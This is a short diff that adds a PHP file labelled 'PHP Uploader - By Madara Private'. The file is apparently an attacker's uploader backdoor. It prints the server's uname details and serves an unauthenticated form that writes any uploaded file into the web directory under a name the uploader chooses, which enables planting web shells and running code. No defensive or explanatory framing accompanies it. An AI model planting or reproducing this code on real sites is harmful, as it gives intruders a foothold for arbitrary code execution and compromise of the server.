@@ -1,0 +1,15 @@
+<?php
+echo "PHP Uploader - By Madara Private";
+echo "Enjoy ! :*";
+echo "<br>".php_uname()."<br>";
+echo "<form method='post' enctype='multipart/form-data'>
+<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
+</form>";
+if($_POST['upload']) {
+  if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
+  echo "Done Uploaded!";
+  } else {
+  echo "Failed to Upload.";
+  }
+}
+?>
